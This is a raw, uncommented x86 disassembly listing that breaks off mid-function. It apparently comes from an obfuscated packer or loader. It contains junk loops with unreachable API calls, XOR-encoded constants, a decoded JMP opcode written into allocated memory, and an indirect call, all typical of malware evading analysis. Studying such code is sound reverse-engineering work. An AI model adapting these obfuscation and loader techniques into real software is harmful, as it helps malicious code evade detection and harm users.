  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43369f,0x433627
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x4335cb,0x4336e3
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x4336a3,0x4335bf
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x433633,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x433633
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x433633,ecx
  40d7ea:	cmp    DWORD PTR ds:0x433633,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x433633,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x4335c7,0x4336e7
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x4335cf,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x4335cf
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x4335cf,ecx
  40d852:	cmp    DWORD PTR ds:0x4335cf,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x4335cf,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x4335cf,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x4335cf
  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x4335cf,ecx
  40d894:	jmp    0x40d845
  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43369b
  40d8a4:	add    esi,DWORD PTR ds:0x433663
  40d8aa:	mov    DWORD PTR ds:0x43369b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x4335c7
  40d8bc:	and    eax,DWORD PTR ds:0x43362f
  40d8c2:	mov    ds:0x4335c7,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x4335d3,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x4336db,0x0
  40d8e4:	jmp    0x40d8f8
  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x4336db
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x4336db,edi
  40d8f8:	cmp    DWORD PTR ds:0x4336db,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x4336db,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x433627,0x4336df
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x4335d3
  40d93b:	and    edi,DWORD PTR ds:0x4336af
  40d941:	mov    DWORD PTR ds:0x4335d3,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x433627,0x13
  40d953:	cmp    DWORD PTR ds:0x433627,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x433627,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x433627,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x433627
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x433627,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x433627
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x433627,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x4335cf
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x43365b,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x433673,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43361f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x4335df,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x4336e3,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x43366b,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x4335cf
  40da21:	sub    DWORD PTR ds:0x4335e7,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x4335db,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x4336af,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x4336af
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x4336af,ecx
  40da55:	cmp    DWORD PTR ds:0x4336af,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x4336af,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x4336af,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x4336af
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x4336af,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x4336db,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433617,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433617
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433617,ecx
  40dabd:	cmp    DWORD PTR ds:0x433617,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433617,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x4338f4
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x4335e3,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x433627,0x4335cf
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x4336d7,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x4335c3,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x4335c7,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x43364f
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x4335e3,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43369f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43369f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43369f,ecx
  40db80:	cmp    DWORD PTR ds:0x43369f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43369f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43369f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43361f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x4336a7,0x12
  40dbc3:	cmp    DWORD PTR ds:0x4336a7,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x4336a7,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x4336e7
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x4336a7,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x4336a7
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x4336a7,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x4336a7
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x4336a7,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433697,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433697
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433697,eax
  40dc3b:	cmp    DWORD PTR ds:0x433697,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x4337f5
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433697,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433697
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433697,eax
  40dc72:	cmp    DWORD PTR ds:0x433697,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x4335cb,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x4335c7,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x4336f3,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43361f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43361f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43361f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43361f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43361f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43361f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43361f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43361f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x433627
  40dd0d:	sbb    edx,DWORD PTR ds:0x4336e7
  40dd13:	mov    DWORD PTR ds:0x433627,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x4336eb
  40dd26:	or     DWORD PTR ds:0x43369b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x433633
  40dd3a:	and    DWORD PTR ds:0x43369f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x4335d7,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x4335cf,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x4335db,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x4336eb,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43369b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x4335db,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x433627,0x4336af
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x4336df,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43361f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x4335db,0x4336af
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x4335cb
  40ddeb:	or     DWORD PTR ds:0x43365f,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x4336db,0x433633
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x4336e3,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x43366f,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x43362b,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x43362b
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x43362b,edx
  40de3a:	cmp    DWORD PTR ds:0x43362b,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x43362b,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x4336e7,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43369b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x4336d7,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x4336e3
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433617,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x433667,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x4335d7,0x1ded
  40e1e2:	mov    eax,0xf89c8534
  40e1e7:	mov    ecx,DWORD PTR ds:0x43365f
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x4336ab,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x43362f
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433697,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x4336a7,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x4336a7
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x4336a7,ecx
  40e244:	cmp    DWORD PTR ds:0x4336a7,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
